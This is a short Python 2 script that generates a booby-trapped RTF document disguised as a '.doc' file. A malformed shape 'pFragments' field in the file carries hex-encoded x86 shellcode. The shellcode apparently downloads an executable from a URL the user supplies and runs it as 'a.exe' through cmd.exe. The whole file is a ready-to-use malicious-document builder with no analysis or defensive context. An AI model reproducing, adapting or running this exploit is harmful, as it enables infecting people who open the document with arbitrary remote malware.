import binascii

ddl_link = raw_input('DDL URL: ')
filename = raw_input('Filename for .doc: ')

file="{\\rtf1\ansi\ansicpg1252\deff0\deflang1033{\fonttbl{\f0\fswiss\fcharset0 Arial;}{\f1\fswiss\fprq2\fcharset0 Berlin Sans FB Demi;}{\f2\fnil\fcharset2 Symbol;}}{/*/*/*}"
file+="\x0d\x0a"
file+="{\colortbl ;\red128\green128\blue0;}"
file+="{\*\generator Msftedit 5.41.15.1507;}\viewkind4\uc1\pard{\pntext\f2\'B7\tab}{\*\pn\pnlvlblt\pnf2\pnindent0{\pntxtb\'B7}}\fi-720\li720\qc\cf1\ul\b\i\f0\fs20 5/28/2011\cf0\ulnone\b0\i0\par"
file+="\cf1\ul\b\i\f1\fs40{\pntext\f2\'B7\tab}HI ........\cf0\ulnone\b0\i0\f0\fs20\par{\shp{\sp}}{\shp{\sp}}{\shp{\sp}}{\shp{\*\shpinst\shpfhdr0\shpbxcolumn\shpbypara\sh pwr2}{\sp{\sn {}{}{\sn}{\sn}{\*\*}pFragments}{\*\*\*}{\sv {\*}9;2;ffffffffff#0500000000000000000000000000000000000000007bd493780000807c0000807cBBBBBBBBCCCCCCCCDDDDDDDD909090909090414141414141414141414141eb7731c9648b71308b760c8b761c8b5e088b7e208b3666394f1875f2c3608b6c24248b453c8b54057801ea8b4a188b5a2001ebe334498b348b01ee31ff31c0fcac84c07407c1cf0d01c7ebf43b7c242875e18b5a2401eb668b0c4b8b5a1c01eb8b048b01e88944241c61c3e892ffffff5f81ef98ffffffeb05e8edffffff688e4e0eec53e894ffffff31c966b96f6e516875726c6d54ffd068361a2f7050e87affffff31c951518d3781c6eeffffff8d560c525751ffd06898fe8a0e53e85bffffff415156ffd0687ed8e27353e84bffffffffd0636d642e657865202f632020612e65786500"
URL2="00"
nxt="{}}}}}}"

binnu=binascii.b2a_hex(ddl_link)
textfile = open(filename , 'w')
textfile.write(file+binnu+URL2+nxt)
textfile.close()
